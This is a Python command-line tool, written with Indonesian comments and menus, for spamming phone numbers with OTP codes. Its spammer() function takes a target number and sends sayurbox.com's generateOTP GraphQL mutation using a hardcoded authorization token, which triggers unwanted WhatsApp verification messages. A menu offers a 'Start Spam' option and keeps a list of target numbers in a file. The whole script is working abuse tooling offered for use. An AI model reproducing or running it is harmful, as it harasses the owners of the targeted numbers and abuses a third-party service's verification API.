#coding: utf-8
# module
import os,sys,time,getpass,json,requests
from tqdm import tqdm
import pathlib
import os.path
from signal import signal, SIGINT
from sys import exit

#Warna
red   = '\x1b[31m' # Merah
green = '\x1b[32m' # Hijau
yellow = '\x1b[33m' # Kuning
blue  = '\x1b[34m' # Biru
magenta = '\x1b[35m' # Ungu
cyan  = '\x1b[36m' # Biru Muda
white = '\x1b[37m' # Putih
reset = '\x1b[39m' # Reset Warna ( Kembali Ke Warna Awal )
brblack = '\x1b[90m' # Hitam Terang
R = '\x1b[91m' # Merah Terang
brgreen = '\x1b[92m' # Hijau Terang
k = '\x1b[93m' # Kuning Terang
brblue = '\x1b[94m' # Biru Terang
brmgnt = '\x1b[95m' # Ungu Terang
brcyan = '\x1b[96m' # Biru Muda Terang
G = '\x1b[97m' # Putih Terang# username
username = "bima"
password = "bima"

#spam
def spammer():
  os.system("reset")
  os.system("clear")
  sp("\x1b[91m[!]Peringatan! (Gunakan awalan 8xxxx)")
  sp("")

  no = input("Nomor Target : ")

  if no =="":
    sp("Tidak boleh kosong!")
    time.sleep(2)
    spammer()

  head = {"Host": "www.sayurbox.com",
  "content-length": "289",
  "sec-ch-ua-mobile": "?1",
  "authorization": "eyJhbGciOiJSUzI1NiIsImtpZCI6ImY4NDY2MjEyMTQxMjQ4NzUxOWJiZjhlYWQ4ZGZiYjM3ODYwMjk5ZDciLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImF1ZCI6InNheXVyYm94LWF1ZGllbmNlIiwiYXV0aF90aW1lIjoxNjY5MTg2NjA2LCJleHAiOjE2NzE3Nzg2MDYsImlhdCI6MTY2OTE4NjYwNiwiaXNzIjoiaHR0cHM6Ly93d3cuc2F5dXJib3guY29tIiwibWV0YWRhdGEiOnsiZGV2aWNlX2luZm8iOm51bGx9LCJuYW1lIjpudWxsLCJwaWN0dXJlIjpudWxsLCJwcm92aWRlcl9pZCI6ImFub255bW91cyIsInNpZCI6IjM2OGRkNDg3LWI1NTYtNDc0Yy04OTFiLTU0M2U5ZDI4Y2JkNiIsInN1YiI6IkdSYkpYeC1XRVdldWVJTk1VWDRaSFlaSzRhYy0iLCJ1c2VyX2lkIjoiR1JiSlh4LVdFV2V1ZUlOTVVYNFpIWVpLNGFjLSJ9.cIxcllPPAfANqSn4fPm6XUjez4weRYDkHVuR4c0QrfudK8gZjrsCG45MPDgSayHrF031ZKW7jL7QW9zMbqaC7RPGpyw25nJlMBKQghQiWNUUH7pmnihLaJNWwqXiZYTtKdd8uNd_Coy0jhbTvMnUioOqDnJZ4w8hUIjidczAov-5097vHs071dKWYzoorSrbru6rzqCAQqp5cUdOIpzLihYCr1xMj4D0YkLOpwKYh-mirokpsuqbtDa9iyNT1TvUM9HWZVOehC22h01xSsoT8O7O3DlpetG48ur-5SD3rTtQzVx1ghCexF1ecBAJ3oJLCqEz8FjuUYcRmI7WOuUvKg",
  "user-agent": "Mozilla/5.0 (Linux; Android 11; Infinix X688B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36",
  "content-type": "application/json",
  "accept": "*/*",
  "x-bundle-revision": "17.4",
  "x-sbox-tenant": "sayurbox",
  "x-binary-version": "2.5.0",
  "sec-ch-ua-platform": "Android",
  "origin": "https://www.sayurbox.com",
  "sec-fetch-site": "same-origin",
  "sec-fetch-mode": "cors",
  "sec-fetch-dest": "empty",
  "accept-encoding": "gzip, deflate, br",
  "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

  data = json.dumps([{"operationName":"generateOTP","variables":{"destinationType":"whatsapp","identity":"+62"+no},"query":"mutation generateOTP($destinationType: String!, $identity: String!) {\n  generateOTP(destinationType: $destinationType, identity: $identity) {\n    id\n    __typename\n  }\n}"}])
  for i in range(1):
    pos = requests.post("https://www.sayurbox.com/graphql/v1?deduplicate=1",headers=head,data=data).text
    if "__typename" in pos:
      sp("Berhasil!")
      sp("Apabila belum terkirim berarti delay!")
      time.sleep(2)
      menu()
    else:
      sp("Gagal")







#tambah
def tambah():
  os.system("clear")
  sp ("Masukan nomor dengan awalan +62")
  nomort = input(">")
  with open("target.txt", "a+") as a:
      a.write(nomort)
      a.write('\n')
      a. close()
  sp ("Ingin menambahkan nomor lagi? [Y/N]")
  tmbah = input("[Y/N]")
  if tmbah == "Y":
     tambah()
  if tmbah == "N":
     menu()
  else:
     sp ("Input salah")
     time.sleep(2)
     menu()


# mengetik otomatis cepat
def sp(a):
  for e in a + "\n":
    sys.stdout.write(e)
    sys.stdout.flush()
    time.sleep(0.005)

#pek
def handler(signal_received, frame):
    # Handle any cleanup here
    sp("\x1b[91m[!]CTRL + C DETECTED!")
    sp("[!]Program Terminated!")
    sp("Exit...")
    exit(2)

if __name__ == '__main__':
    # Tell Python to run the handler() function when SIGINT is recieved
    signal(SIGINT, handler)

#path
def path():

  if os.path.isfile('user.txt'):
      sp ("Username detected !")
      menu()
  else:
      sp ("Username null")
      user()


# username
def user():
  os.system("clear")
  usr = input("Your name :")
  with open("user.txt", "w") as f:
    f.write("Your username is "+ usr)
    f. close()
    menu()
    if usr == "":
       sp ("Gaboleh kosong")
       time.sleep(2)
       user()

#Main menu
def menu():
  os.system("reset")
  os.system("clear")
  sp ("\x1b[36m______________________________________________________")
  sp ("\x1b[92m [\x1b[91m•\x1b[92m] \x1b[33m Author \x1b[35m      : Bimz")
  sp ("\x1b[92m [\x1b[91m•\x1b[92m] \x1b[33m Instagram \x1b[35m   : bimzgz.vfx")
  sp ("\x1b[92m [\x1b[91m•\x1b[92m] \x1b[33m Github \x1b[35m      : https://github.com/Bimzgzx")
  with open('user.txt') as f:
    contents = f.read()
  sp ("\x1b[92m [\x1b[91m•\x1b[92m] \x1b[33m Information \x1b[35m : " + contents)
  sp ("\x1b[36m______________________________________________________")
  sp ("\x1b[32m                      MENU                                    ")
  sp ("\x1b[91m")
  sp ("    [1]Start Spam                          ")
  sp ("    [2]Start Spam(MASSIVE)                 ")
  sp ("    [3]Setting file nomor                  ")
  sp ("    [4]List file nomor                     ")
  sp ("    [5]Reset Nomor                         ")
  sp ("    [6]Exit                                ")
  sp ("\x1b[36m______________________________________________________")
  menupilih = input(">")
  if menupilih =="1":
       os.system("clear")
       sp ("Api tersedia 1")
       time.sleep(2)
       spammer()
       
  if menupilih == "2":
       os.system("clear")
       sp ("Tidak tersedia!")
       time.sleep(1)
       menu()

  if menupilih == "3":
      tambah()

  if menupilih == "4":
      if os.path.isfile('target.txt'):
        sp ("File detected !")
        with open('target.txt') as a:
          contents = a.read()
          sp (contents)
          time.sleep(5)
        menu()
      else:
        sp("Kamu belum menambahkan nomor!")
        time.sleep(3)
        menu()
  
  if menupilih == "5":
      if os.path.isfile('target.txt'):
        sp ("File detected !")
        sp ("Reset succesfull!")
        os.system("rm target.txt")
        time.sleep(4)
        menu()
      else:
        sp("target.txt not found!")
        time.sleep(3)
        menu()
        
       
  if menupilih == "6":
      sp ("Exit...")
      sp ("Goodbyee :)")
      exit()
  else:
    sp("Terjadi kesalahan!")
    time.sleep(1)
    menu()

path()
